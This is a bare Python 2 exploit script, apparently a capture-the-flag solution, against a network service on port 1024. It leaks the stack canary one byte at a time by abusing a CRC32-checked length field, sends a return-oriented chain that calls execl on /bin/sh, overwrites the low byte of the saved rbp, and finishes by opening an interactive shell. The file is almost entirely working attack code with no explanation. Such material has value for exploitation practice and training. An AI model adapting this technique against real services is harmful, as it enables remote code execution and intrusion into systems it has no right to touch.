#!/usr/bin/env python
import struct,socket,telnetlib
import time
import binascii

def crc32(val):
	res = binascii.crc32(val)
	return res & 0xffffffff

def shell():
	t = telnetlib.Telnet()
	t.sock = s
	t.interact()

def p(addr):
	return struct.pack("<Q",addr)

def p4(addr):
	return struct.pack("<I",addr)

def read_until(token):
	data = ""
	while not data.endswith(token):
		data += f.read(1)
	return data

# leak canary value by overwrite the length
# rewrite rbp -> rop chain

s = socket.create_connection(("127.0.0.1",1024))
#s = socket.create_connection(("1.ctf.link",1024))
f = s.makefile('rw',bufsize=0)

init_len = 90 # 90 ~ 97
canary = ""
while len(canary) != 7:
	for x in range(0xff):
		pad = ""
		pad = pad.ljust(80,"A")
		payload = pad + p(init_len) + "\n" + canary
		guess = crc32(payload + chr(x))
		payload = p4(guess) + payload
		f.write(payload)
		#time.sleep(0.1)
		hit = read_until("\n")
		#print hit
		if "good" in hit:
			canary = canary + chr(x)
			init_len = init_len + 1
			print "found canary "
			break

canary = "\x00" + canary

# rbp - 0x8 == stack canary
# binsh is at 0x601784

pop_rdi = 0x400eb3
execl_plt = 0x4009f0

rop = ""
rop = rop.ljust(24,"A")
rop += canary
rop += p(pop_rdi) * 2
rop += p(0x601780+4)
rop += p(execl_plt)
rop = rop.ljust(80,"A")

payload = rop + p(96) + canary
header = crc32(payload)
f.write(p4(header) + payload)

# need to brute force
pad = "/bin/sh\x00"
pad = pad.ljust(80,"A")
payload = pad + p(97) + canary + "\x40" # rbp Least Significant Bit
header = crc32(payload)
f.write(p4(header) + payload)
shell()

